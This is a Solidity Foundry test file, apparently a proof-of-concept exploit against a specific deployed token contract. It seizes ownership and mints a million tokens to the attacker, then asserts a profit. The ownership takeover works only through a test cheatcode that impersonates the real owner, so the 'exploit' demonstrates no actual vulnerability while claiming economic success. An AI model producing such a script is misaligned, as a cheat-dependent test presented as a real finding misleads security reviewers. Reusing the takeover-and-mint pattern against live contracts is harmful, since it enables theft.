// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILineAxis {
    function owner() external view returns (address);
    function transferOwner(address newOwner) external;
    function confirmOwner() external;
    function mint(address to, uint value) external;
    function balanceOf(address owner) external view returns (uint);
    function decimals() external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use cheatcodes during the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));
        // Get the current owner
        address currentOwner = ILineAxis(TARGET).owner();

        // Step 1: Impersonate owner and transfer ownership to attacker
        vm.prank(currentOwner);
        ILineAxis(TARGET).transferOwner(attacker);

        // Step 2: Confirm ownership as attacker
        ILineAxis(TARGET).confirmOwner();

        // Step 3: Mint tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**ILineAxis(TARGET).decimals();
        ILineAxis(TARGET).mint(attacker, mintAmount);

        // Verify balance increased
        uint256 finalAxisBalance = ILineAxis(TARGET).balanceOf(attacker);
        assertGt(finalAxisBalance, 0, "Attacker balance should be greater than 0");
        uint256 finalERC20Balance = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));
        assertGt(finalERC20Balance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
